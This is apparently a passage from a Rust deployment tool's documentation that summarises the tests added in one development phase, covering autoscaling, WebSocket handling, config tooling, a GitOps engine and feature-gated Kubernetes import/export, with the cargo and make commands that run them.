- **Autoscaling** — `compute_desired` with hysteresis and cooldown is the heart of it (12 tests covering scale-up, scale-down-only-below-threshold, clamping to min/max, oscillation), plus config parsing and the `AutoscaleTracker` baseline/override logic (6).
- **WebSocket** — header detection edge cases (case-insensitive, multi-value `Connection`, opt-in routes) and the 4-byte close frame (8).
- **Config tooling** — compilation and defaults merging (7), `fmt` idempotency and section ordering (4), structural `diff` (8).
- **Lettuce** — types serde (4), git clone/fetch/list (4), webhook HMAC/replay/rate-limit (7), autoscaler-aware diff (7), sync-loop TOML parsing (3), coordinator election (5), signature verification (1).
- **Kubernetes** — import (10) and export (6).

### Feature-gated: Kubernetes import/export

The one gated path in this chapter isn't an environment variable — it's a Cargo feature. K8s import/export pulls in `k8s-openapi`, a heavy dependency most users don't need, so it sits behind a `kubernetes` feature that's *on by default*:

```toml
[features]
default = ["kubernetes"]
kubernetes = ["dep:k8s-openapi"]
```

A plain `cargo test` therefore compiles and runs the K8s tests. If you want to prove the rest of the binary builds and tests *without* that dependency — smaller, faster, no `k8s-openapi` — drop the default features:

```sh
cargo test --no-default-features    # everything except K8s import/export
```

The import/export modules themselves are `#[cfg(feature = "kubernetes")]`, so they simply vanish from the build when the feature is off, and so do their tests.

### Demos: the end-to-end round-trips

Two of this chapter's features are best seen as round-trips, so there's a script for each:

```sh
make toml-demo          # compile -> fmt -> diff -> lint over a sample config tree
make kubernetes-demo    # import K8s YAML to TOML and export it back
```

`kubernetes-demo` is the honest test of the migration story: take real Kubernetes YAML, import it, look at the TOML and the migration report, export it again, and check the round-trip is sane. The correlation logic (Service → Deployment → Ingress → HPA) is exactly what unit tests struggle to cover convincingly, because the interesting bugs are in how resources *fit together*, not in any one conversion.

### Running them

```sh
cargo test --lib meat::blue_green meat::autoscaler   # deploy + scaling
cargo test --lib lettuce                             # GitOps engine
cargo test --lib wrapper                             # WebSocket proxying
cargo test --no-default-features                      # prove it builds without K8s
make toml-demo && make kubernetes-demo                # end-to-end round-trips
```

Phase 9 adds 117 tests, bringing the total to 1380.
